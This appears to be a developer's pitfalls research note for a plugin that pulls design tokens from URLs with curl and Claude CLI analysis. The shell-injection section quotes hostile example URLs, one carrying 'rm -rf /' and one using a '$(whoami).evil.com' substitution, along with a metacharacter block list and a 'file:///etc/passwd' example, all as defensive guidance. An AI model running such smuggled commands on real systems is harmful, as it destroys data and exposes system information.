# Pitfalls Research

**Domain:** Design token extraction from arbitrary URLs via shell commands and AI analysis
**Researched:** 2026-03-08
**Confidence:** HIGH (multiple sources, real-world tool precedent from Dembrandt, direct codebase analysis)

## Critical Pitfalls

### Pitfall 1: curl/fetch Gets Raw HTML, Not Rendered Styles

**What goes wrong:**
Using `curl` or a simple HTTP fetch to grab a page returns only the initial HTML document. Most modern websites load styles via JavaScript frameworks, CSS-in-JS (styled-components, Emotion, Tailwind JIT), or dynamically injected `<style>` tags. The raw HTML contains none of these computed styles. You end up extracting colors from inline styles or static `<link>` stylesheets, missing 50-90% of the actual design tokens on JS-heavy sites.

**Why it happens:**
It is tempting to start with the simplest approach: `curl URL | extract CSS`. This works for static sites but fails silently on SPAs, Next.js/Nuxt apps, or any site using CSS-in-JS. The HTML you get back may contain placeholder `<div>` elements with no styling at all.

**How to avoid:**
Do not attempt to parse raw HTML for styles. Instead, fetch the page source and all linked stylesheets as raw text, then pass that corpus to Claude for AI analysis. Claude can reason about CSS custom properties (`--primary-color`), class naming conventions (`.bg-primary`, `.text-brand`), and inline style patterns even from static sources. For the initial implementation, this is sufficient -- the AI compensates for what raw fetching misses. If accuracy on JS-heavy sites proves insufficient, consider adding a Playwright/headless browser step later.

Practically: fetch the HTML, extract all `<link rel="stylesheet">` href values and `<style>` tag contents, fetch each external stylesheet, and concatenate everything into a single text blob for AI analysis.

**Warning signs:**
- Extraction returns zero or very few colors on a visually rich site
- All extracted values come from a single stylesheet while the site clearly has more styling
- Sites built with React/Vue/Svelte return almost nothing

**Phase to address:**
Phase 1 (Core fetching pipeline). This is the foundational decision. Getting it wrong means rebuilding the entire extraction approach.

---

### Pitfall 2: Shell Command Injection via User-Supplied URLs

**What goes wrong:**
The URL is user input passed to `shell.exec()`. A malicious or malformed URL like `https://example.com; rm -rf /` or `$(whoami).evil.com` could execute arbitrary commands if the URL is interpolated into a shell command string rather than passed as a discrete argument.

**Why it happens:**
The existing plugin already uses `shell.exec('command', [arg1, arg2])` which separates command from arguments (safe pattern). But when building the fetch pipeline, it is easy to accidentally construct compound shell commands like `shell.exec('sh', ['-c', 'curl ' + url + ' | ...'])` which reintroduces injection risk. Also, piping through multiple commands often pushes developers toward string concatenation.

**How to avoid:**
- Always pass the URL as a separate argument, never interpolated into a command string
- Use `shell.exec('curl', ['-sL', '--max-time', '15', url])` -- the URL is an argument, not part of a shell-interpreted string
- Validate URLs before passing to shell: must start with `https://` or `http://`, must parse as a valid URL via `new URL(input)`, reject `file://`, `data:`, `javascript:` schemes
- Reject URLs containing shell metacharacters as an extra safety layer: `;`, `|`, `&`, `` ` ``, `$()`, etc.
- Consider SSRF: reject URLs pointing to `localhost`, `127.0.0.1`, `0.0.0.0`, `169.254.x.x` (link-local), `10.x.x.x`, `192.168.x.x`, `172.16-31.x.x` (private ranges)

**Warning signs:**
- Any use of `sh -c` or backtick interpolation with user input
- URL validation happening after shell execution rather than before
- No URL validation at all ("it's just a URL, what could go wrong?")

**Phase to address:**
Phase 1 (URL input and fetching). Must be correct from the first implementation. Not something to "add later."

---

### Pitfall 3: Claude CLI Output Buffer Overflow / Timeout on Large Pages

**What goes wrong:**
The AI analysis step involves piping potentially large CSS content (some sites have 500KB+ of CSS) through the Claude CLI via `shell.exec()`. Claude Code has known issues with large stdout output (documented in GitHub issues #7263 and #15001): processes can hang, return empty output, or crash silently due to memory exhaustion. The default shell timeout is 2 minutes, which may not be enough for AI analysis of large CSS corpora.

**Why it happens:**
A single-page site might reference 10+ stylesheets totaling hundreds of KB. Passing all of this as context to Claude via CLI means both the input and output can be substantial. The `shell.exec()` interface buffers stdout/stderr, and the host app may have buffer limits that are not documented.

**How to avoid:**
- Truncate CSS input before sending to Claude. Cap at a reasonable size (e.g., 50-100KB of CSS text). Prioritize: CSS custom properties/variables first, then class definitions with color/font properties, then everything else.
- Set explicit timeouts on the `shell.exec()` call: `{ timeout: 60000 }` or higher
- Structure the Claude prompt to request concise JSON output, not verbose analysis
- If the CLI call fails or times out, surface a clear error to the user rather than hanging silently
- Consider splitting into two Claude calls if needed: one for colors/fonts, one for voice/tone

**Warning signs:**
- Extraction works on simple sites but hangs on large ones (e.g., amazon.com, github.com)
- `shell.exec()` returns empty stdout with exit code 0
- Extraction takes over 60 seconds with no progress feedback

**Phase to address:**
Phase 2 (AI analysis pipeline). After basic fetching works, the AI integration needs careful sizing limits and timeout handling.

---

### Pitfall 4: Color Deduplication and Semantic Naming Failure

**What goes wrong:**
A typical website uses 30-100+ distinct color values across its CSS. Many are near-duplicates (`#333` vs `#333333` vs `rgb(51,51,51)`), browser defaults (`black`, `transparent`, `inherit`), or state variants (`hover` opacity shifts). Without intelligent deduplication and filtering, the extracted color palette is an overwhelming wall of 50+ swatches that users immediately dismiss as useless. The existing `BrandColor` type expects a curated list with human-readable names like "Primary" or "Accent."

**Why it happens:**
Naive extraction treats every unique color string as a distinct brand color. CSS color formats vary (`hex`, `rgb()`, `hsl()`, `oklch()`, named colors), and the same visual color can appear in many formats. Additionally, many CSS colors are functional (border colors, shadow colors, overlay backgrounds) rather than brand-meaningful.

**How to avoid:**
- Normalize all colors to a single format (hex6) before deduplication
- Use color distance algorithms (Delta E / CIEDE2000 or simpler Euclidean in LAB space) to cluster near-duplicates
- Filter out browser defaults and transparent/inherit values before analysis
- Lean heavily on AI for the semantic naming step: Claude can look at CSS custom property names (`--color-primary`, `--brand-blue`) and element context to assign meaningful names
- Cap the output: return at most 8-12 colors. A brand palette that big is already pushing it
- Provide the AI with guidance: "Identify the primary, secondary, accent, background, text, and any additional brand colors. Ignore grays used only for borders or shadows."

**Warning signs:**
- Extraction returns more than 15 colors
- Colors are named generically ("Color 1", "Color 2") or by hex value
- Duplicate visual colors appear with different names
- Browser default colors (black, white, transparent) appear in results

**Phase to address:**
Phase 2 (AI prompt engineering). The quality of extraction depends almost entirely on how well the AI prompt constrains and guides the output.

---

### Pitfall 5: Treating the Extraction as Deterministic

**What goes wrong:**
Developers build the feature expecting the same URL to always produce the same results. But AI analysis is inherently non-deterministic: different runs may name colors differently, identify different fonts as "primary," or generate different voice/tone descriptions. Users who run extraction twice and get different results lose trust in the feature.

**Why it happens:**
LLM outputs vary between calls, especially for subjective tasks like naming colors or inferring brand voice. Temperature, context window variations, and prompt sensitivity all contribute.

**How to avoid:**
- Frame the feature as "suggested starting point, review before saving" -- the existing PROJECT.md already plans for a review step, which is correct
- Do not auto-save extracted tokens. Always present them for review first
- In the AI prompt, provide structured output format (JSON schema) to minimize variation in structure even if values vary slightly
- Consider caching: if user extracts the same URL again within a session, offer to show previous results rather than re-running
- Use temperature 0 if the Claude CLI supports it (pass `--temperature 0` or equivalent flag)

**Warning signs:**
- No review/confirmation step before tokens are saved
- Tests assert exact color names or values from extraction (will be flaky)
- Users report "it gave me different colors than last time"

**Phase to address:**
Phase 3 (Review UI). The UX must make non-determinism feel like a feature ("AI suggestions for your review") rather than a bug.

---

### Pitfall 6: Fetching Fails Silently on Bot-Protected Sites

**What goes wrong:**
Many websites (especially larger brands whose design systems you would most want to extract) use Cloudflare, Akamai, or similar CDN-level bot protection. A simple `curl` request returns a challenge page, CAPTCHA HTML, or a 403 response -- not the actual site content. The extraction proceeds with this garbage HTML and produces nonsensical results rather than surfacing an error.

**Why it happens:**
Bot protection responses often return HTTP 200 with a valid HTML page (the challenge page), so checking for HTTP status codes alone does not catch this. The response looks like a real page, just not the right one.

**How to avoid:**
- Check the fetched HTML for known bot-protection signatures: "Checking your browser", "cf-browser-verification", "Just a moment...", Cloudflare ray IDs, Akamai challenge scripts
- Set a proper User-Agent header on curl requests: `curl -H 'User-Agent: Mozilla/5.0...'`
- If bot protection is detected, inform the user clearly: "This site has bot protection. Try a different page or enter tokens manually."
- Do not attempt to bypass bot protection (ethical and legal concerns, plus it is an arms race you will lose)
- Follow redirects (`curl -L`) since some protections redirect to a challenge URL

**Warning signs:**
- Extracted colors are all Cloudflare/Akamai brand colors (orange, white)
- Voice/tone analysis returns text about "verifying your browser"
- Very short HTML responses from sites that should have substantial content

**Phase to address:**
Phase 1 (Fetching pipeline). Detection must happen immediately after fetching, before any analysis begins.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Passing entire raw HTML+CSS to Claude without preprocessing | Simpler pipeline, no extraction logic needed | Hits context limits on large sites, slower, more expensive, less consistent results | Never for production. Preprocessing is essential. |
| Hardcoding the Claude CLI invocation syntax | Ships faster | Breaks if Claude CLI changes flags or invocation pattern | MVP only, must abstract behind a function immediately |
| Skipping URL validation | Faster to implement | Command injection vulnerability | Never |
| No timeout on fetch or AI calls | Fewer error states to handle | UI hangs indefinitely on slow sites or large pages | Never |
| Returning all extracted colors without capping | "More complete" results | Overwhelming UX, users dismiss the whole feature | Never. Cap at 8-12 colors. |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| `shell.exec()` with curl | Using `sh -c` to pipe commands, reintroducing injection risk | Use separate `shell.exec()` calls: one for curl, process output in JS, then call Claude CLI |
| Claude CLI for analysis | Passing CSS as a command-line argument (hits ARG_MAX limits) | Write CSS to a temp file, pass the file path to Claude, clean up after |
| Existing `BrandSettings` merge | Overwriting user's existing brand data on re-extraction | Merge strategy: only fill empty fields, or present side-by-side comparison |
| External stylesheet fetching | Fetching stylesheets from different domains (CORS-irrelevant for curl, but may be blocked by CDN) | Follow redirects, set User-Agent, handle 403/404 gracefully per stylesheet |
| Temp file cleanup | Creating temp files for CSS/prompt content and never cleaning up | Use `mktemp`, clean up in a `finally` block, or use stdin piping where possible |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Fetching all linked stylesheets sequentially | 10+ second extraction for sites with many CSS files | Fetch in parallel (multiple curl calls), or cap at first 5-10 stylesheets | Sites with 10+ external stylesheets |
| No CSS size cap before AI analysis | Claude CLI hangs or returns empty output | Truncate concatenated CSS at 100KB, prioritize CSS variables and color/font properties | Sites with 200KB+ CSS (common for enterprise sites) |
| Blocking UI during extraction | Modal feels frozen, user thinks it crashed | Show progress states: "Fetching page...", "Analyzing styles...", "Generating tokens..." | Always, since extraction takes 10-30+ seconds |
| Re-fetching on every tab switch | Unnecessary network calls and AI invocations | Cache extraction results in component state, only re-fetch on explicit user action | Immediately apparent in dev |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Interpolating URL into shell command string | Arbitrary command execution on user's machine | Always pass URL as array argument to `shell.exec()`, never in a `sh -c` string |
| No URL scheme validation | `file:///etc/passwd` reads local files, `javascript:` scheme may cause issues | Allowlist `http:` and `https:` only, reject all other schemes |
| No private IP filtering (SSRF) | URL like `http://localhost:3000/admin` could hit local services | Parse URL hostname, reject private/reserved IP ranges and `localhost` |
| Writing fetched content to temp files without sanitization | Path traversal if filename derived from URL | Use `mktemp` for temp files, never derive filenames from URL components |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| No progress indication during extraction | User clicks "Extract" and sees nothing for 15-30 seconds, assumes it is broken | Multi-step progress: "Fetching page...", "Extracting stylesheets...", "AI analyzing...", "Done" |
| Showing 40+ extracted colors | User is overwhelmed, feature feels low-quality | Cap at 8-12 curated colors with semantic names |
| Auto-replacing existing brand data | User loses their manually curated settings | Always show extraction results for review; merge or replace is user's choice |
| No way to re-extract or try a different URL | User stuck if first extraction was poor | Keep "Start from URL" button accessible even after first extraction |
| Extraction fails with no actionable error | User has no idea why it did not work | Specific error messages: "Site has bot protection", "Could not find any stylesheets", "Analysis timed out -- try a simpler page" |
| Presenting voice/tone extraction with same confidence as color extraction | Voice/tone is much more subjective and less reliable than color/font extraction | Visually differentiate confidence: colors/fonts as "extracted", voice as "AI suggestion" |

## "Looks Done But Isn't" Checklist

- [ ] **URL fetching:** Often missing redirect handling -- verify `curl -L` follows redirects and final URL is still valid
- [ ] **Stylesheet extraction:** Often missing `@import` rules inside `<style>` tags -- verify nested imports are followed
- [ ] **Color extraction:** Often missing CSS custom properties (`var(--color-primary)`) -- verify CSS variables in `:root` are parsed
- [ ] **Font extraction:** Often missing Google Fonts `@import` URLs -- verify font-family values reference actual loaded fonts, not just fallback stacks
- [ ] **Error handling:** Often missing timeout on the Claude CLI call -- verify the extraction fails gracefully after a reasonable timeout
- [ ] **Existing data merge:** Often missing the case where user already has partial brand data -- verify extraction does not silently overwrite
- [ ] **Bot protection detection:** Often missing the check for challenge pages -- verify Cloudflare/Akamai responses are caught before analysis
- [ ] **Large site handling:** Often missing CSS size caps -- verify extraction does not hang on sites like amazon.com or github.com

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Command injection vulnerability shipped | HIGH | Audit all `shell.exec()` calls, add URL validation, release patch immediately |
| AI returns garbage results (wrong colors) | LOW | User discards results, tries again or enters manually. No data loss since results require review before saving. |
| Extraction hangs/crashes on large site | LOW | Kill the process, add size caps and timeouts, retry |
| Bot protection not detected, wrong tokens extracted | LOW | User notices obviously wrong colors in review step, discards and enters manually |
| Existing brand data overwritten | MEDIUM | If plugin storage has previous state in undo history or can be re-exported from CLAUDE.md markers, recoverable. Otherwise data is lost. Always present review step. |

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Raw HTML missing rendered styles | Phase 1: Fetching | Test against a React SPA -- verify CSS custom properties and linked stylesheets are captured |
| Command injection via URL | Phase 1: URL Input | Code review: grep for `sh -c` or string interpolation with user input. Automated test with metacharacter URLs. |
| Claude CLI buffer overflow / timeout | Phase 2: AI Pipeline | Test with a 500KB+ CSS corpus. Verify timeout fires and error is shown. |
| Color deduplication failure | Phase 2: AI Prompt | Test output color count. Verify no hex duplicates. Verify semantic names. |
| Non-deterministic results | Phase 3: Review UI | Run extraction 3x on same URL, verify structure is consistent even if values vary slightly. |
| Bot-protected sites | Phase 1: Fetching | Test against cloudflare-protected site. Verify error message, not garbage extraction. |
| No progress feedback | Phase 3: Review UI | Manual test: extraction takes > 5s, verify progress states are visible |
| Existing data overwrite | Phase 3: Review UI | Test extraction when user already has 5 colors. Verify merge/review flow. |

## Sources

- [Dembrandt Blackpaper](https://www.dembrandt.com/blackpaper) -- design token extraction tool using Playwright, confidence-scored tokens
- [Dembrandt GitHub](https://github.com/dembrandt/dembrandt) -- open-source reference implementation
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection) -- shell injection prevention
- [Snyk: Preventing SSRF in Node.js](https://snyk.io/blog/preventing-server-side-request-forgery-node-js/) -- URL validation and SSRF prevention
- [Claude Code Issue #7263](https://github.com/anthropics/claude-code/issues/7263) -- empty output with large stdin in headless mode
- [Claude Code Issue #15001](https://github.com/anthropics/claude-code/issues/15001) -- silent crash from unbounded command output
- [Claude Code Issue #5615](https://github.com/anthropics/claude-code/issues/5615) -- timeout configuration guide
- [Project Wallace CSS Design Tokens](https://www.projectwallace.com/design-tokens) -- CSS token analysis approach
- [Style-scraper](https://github.com/mrseanryan/style-scraper) -- computed style extraction via headless browser
- [Securing Node.js Command Injection](https://www.nodejs-security.com/blog/secure-javascript-coding-practices-against-command-injection-vulnerabilities) -- execFile vs exec patterns

---
*Pitfalls research for: Design token extraction from arbitrary URLs*
*Researched: 2026-03-08*
